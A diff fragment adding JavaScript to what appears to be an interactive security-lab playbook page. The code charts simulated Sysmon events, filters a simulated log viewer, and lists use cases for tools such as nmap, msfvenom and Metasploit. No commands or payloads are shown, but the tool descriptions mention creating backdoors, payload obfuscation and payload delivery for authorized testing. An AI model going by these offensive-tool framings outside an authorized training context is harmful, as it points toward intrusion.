+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path>
+                        </svg>
+                        View Official Documentation
+                    </a>
+                `;
+                
+                toolModal.classList.remove('hidden');
+                toolModal.classList.add('animate-fade-in');
+                
+                // Smooth scroll to modal
+                smoothScrollTo(toolModal);
+                
+                document.getElementById('close-modal').addEventListener('click', () => {
+                    toolModal.classList.add('animate-fade-out');
+                    setTimeout(() => {
+                        toolModal.classList.add('hidden');
+                        toolModal.classList.remove('animate-fade-out');
+                    }, 300);
+                });
+            }
+
+            function renderDashboard() {
+                const ctx = document.getElementById('sysmonEventsChart').getContext('2d');
+                const chart = new Chart(ctx, {
+                    type: 'bar',
+                    data: {
+                        labels: appData.sysmonData.labels,
+                        datasets: [{
+                            label: 'Event Count',
+                            data: appData.sysmonData.counts,
+                            backgroundColor: [ 'rgba(231, 76, 60, 0.6)', 'rgba(52, 152, 219, 0.6)', 'rgba(241, 196, 15, 0.6)', 'rgba(46, 204, 113, 0.6)' ],
+                            borderColor: [ 'rgba(231, 76, 60, 1)', 'rgba(52, 152, 219, 1)', 'rgba(241, 196, 15, 1)', 'rgba(46, 204, 113, 1)' ],
+                            borderWidth: 1
+                        }]
+                    },
+                    options: {
+                        responsive: true, maintainAspectRatio: false,
+                        plugins: { legend: { display: false }, tooltip: { callbacks: { title: () => '', label: (context) => `${context.label}: ${context.raw} events` } } },
+                        scales: { y: { beginAtZero: true, title: { display: true, text: 'Number of Events' } }, x: { ticks: { maxRotation: 0, minRotation: 0 } } },
+                        onClick: (event, elements) => {
+                            if (elements.length > 0) {
+                                const clickedIndex = elements[0].index;
+                                const eventLabel = appData.sysmonData.labels[clickedIndex];
+                                const eventCode = parseInt(eventLabel.match(/\((\d+)\)/)[1]);
+                                updateLogViewer(eventCode);
+                            }
+                        }
+                    }
+                });
+            }
+            
+            function updateLogViewer(eventCode) {
+                const logViewerContent = document.getElementById('log-viewer-content');
+                const logViewerTitle = document.getElementById('log-viewer-title');
+                const filteredLogs = appData.sysmonData.logs.filter(log => log.eventCode === eventCode || eventCode === 0);
+                logViewerTitle.textContent = eventCode === 0 ? 'Simulated Log Viewer (All Events)' : `Simulated Log Viewer (Event ID: ${eventCode})`;
+                if (filteredLogs.length > 0) {
+                    logViewerContent.innerHTML = filteredLogs.map(log => `
+                        <div class="terminal-output text-sm p-3 mb-2 border-l-4 ${log.eventCode === 1 ? 'border-red-500' : 'border-blue-500'} bg-gray-800 rounded-r-md">
+                            <div class="font-semibold text-gray-300">${new Date(log.timestamp).toLocaleString()} - Event ID ${log.eventCode}</div>
+                            <pre class="text-gray-400 mt-1">${log.details}</pre>
+                        </div>
+                    `).join('');
+                } else {
+                    logViewerContent.innerHTML = '<p class="text-gray-500">No logs found for this event type.</p>';
+                }
+            }
+
+            // Add this new function for smooth scrolling
+            function smoothScrollTo(element) {
+                element.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }
+
+            // Add helper functions for tool details
+            function getToolUseCases(toolId) {
+                const useCases = {
+                    nmap: [
+                        "Network discovery and mapping",
+                        "Port scanning and service enumeration",
+                        "Vulnerability assessment",
+                        "OS and version detection"
+                    ],
+                    msfvenom: [
+                        "Creating custom payloads for penetration testing",
+                        "Generating shellcode for exploits",
+                        "Creating backdoors for authorized testing",
+                        "Payload obfuscation and encoding"
+                    ],
+                    pythonhttp: [
+                        "Quick file sharing in local networks",
+                        "Hosting payloads for testing",
+                        "Simple web server for development",
+                        "File transfer in controlled environments"
+                    ],
+                    metasploit: [
+                        "Exploit development and testing",
+                        "Post-exploitation activities",
+                        "Payload delivery and execution",
+                        "Security assessment and validation"
+                    ],
+                    sysmon: [
+                        "Process monitoring and logging",
+                        "Network connection tracking",
+                        "File system change monitoring",
+                        "Security event correlation"
+                    ],
+                    splunk: [
+                        "Log analysis and correlation",
+                        "Security monitoring and alerting",
+                        "Incident investigation",
+                        "Compliance reporting"
+                    ],
+                    netstat: [
+                        "Network connection verification",
+                        "Port usage monitoring",
+                        "Connection troubleshooting",
+                        "Security status checking"
+                    ]
+                };
+                return useCases[toolId] || [];
+            }
+
+            function getToolConditions(toolId) {
+                const conditions = {
+                    nmap: [
+                        "Network reconnaissance",
+                        "Security assessment",
+                        "System enumeration",
+                        "Authorized scanning"
+                    ],
+                    msfvenom: [
+                        "Penetration testing",
+                        "Security research",
+                        "Authorized testing",
+                        "Controlled environment"
+                    ],
+                    pythonhttp: [
+                        "Local network",
+                        "Testing environment",
+                        "Development setup",
+                        "Controlled access"
+                    ],
+                    metasploit: [
+                        "Security testing",
+                        "Vulnerability assessment",
+                        "Authorized penetration testing",
+                        "Research environment"
+                    ],
+                    sysmon: [
+                        "Windows systems",
+                        "Security monitoring",
+                        "Incident response",
+                        "Forensic analysis"
+                    ],
+                    splunk: [
+                        "Log management",
+                        "Security operations",
+                        "Compliance requirements",
+                        "Incident investigation"
+                    ],
+                    netstat: [
+                        "Connection verification",
+                        "Network troubleshooting",
+                        "Security checking",
+                        "System monitoring"
+                    ]
+                };
+                return conditions[toolId] || [];
+            }
+
+            navLinks.forEach(link => {
+                link.addEventListener('click', (e) => { e.preventDefault(); const sectionId = e.target.getAttribute('data-nav'); navigateTo(sectionId); window.history.pushState({section: sectionId}, '', `#${sectionId}`); });
+            });
+            window.addEventListener('popstate', (e) => { if (e.state && e.state.section) { navigateTo(e.state.section); } else { navigateTo('overview'); } });
+            prevButton.addEventListener('click', () => { if (currentStep > 0) { currentStep--; updatePlaybookStep(); } });
+            nextButton.addEventListener('click', () => { if (currentStep < appData.playbook.length - 1) { currentStep++; updatePlaybookStep(); } });
+            toolCardsContainer.addEventListener('click', (e) => { const card = e.target.closest('.tool-card'); if (card) { const toolId = card.getAttribute('data-tool-id'); showToolModal(toolId); } });
+            toolModal.addEventListener('click', (e) => { if (e.target.id === 'tool-modal') { toolModal.classList.add('hidden'); } });
+            const initialSection = window.location.hash.substring(1) || 'overview';
+            navigateTo(initialSection);
+            updatePlaybookStep();
+            renderTools();
+            renderDashboard();
+            updateLogViewer(0);
+        });
+    </script>
+</body>
+</html>
